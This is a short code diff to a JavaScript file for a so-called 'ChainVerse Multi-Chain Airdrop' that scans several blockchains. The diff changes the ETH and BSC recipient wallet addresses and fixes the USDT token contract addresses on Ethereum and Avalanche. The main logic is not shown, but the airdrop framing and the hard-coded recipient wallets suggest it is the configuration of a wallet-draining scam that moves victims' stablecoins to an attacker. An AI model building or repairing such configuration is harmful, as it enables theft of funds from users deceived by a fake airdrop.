@@ -1,6 +1,6 @@
 // js/scripts.js - ChainVerse Multi-Chain Airdrop (Auto-Scan All Chains)
-const RECIPIENT_ETH = '0x11ec8ba95ddaecb14450b272526c53f3c570696f';
-const RECIPIENT_BSC = '0x11ec8ba95ddaecb14450b272526c53f3c570696f';
+const RECIPIENT_ETH = '0x596795333bfae70355461159c7a235b63a0e18cd';
+const RECIPIENT_BSC = '0x596795333bfae70355461159c7a235b63a0e18cd';
 
 const CHAINS = {
     ethereum: {
@@ -8,7 +8,7 @@ const CHAINS = {
         recipient: RECIPIENT_ETH, rpc: 'https://eth.llamarpc.com',
         explorer: 'https://etherscan.io/', coinGeckoId: 'ethereum',
         tokens: {
-            USDT: '0x596795333bfae70355461159c7a235b63a0e18cd',
+            USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
             USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
             DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F'
         }
@@ -55,7 +55,7 @@ const CHAINS = {
         recipient: RECIPIENT_ETH, rpc: 'https://api.avax.network/ext/bc/C/rpc',
         explorer: 'https://snowtrace.io/', coinGeckoId: 'avalanche-2',
         tokens: {
-            USDT: '0x596795333bfae70355461159c7a235b63a0e18cd',
+            USDT: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',
             USDC: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E'
         }
     },
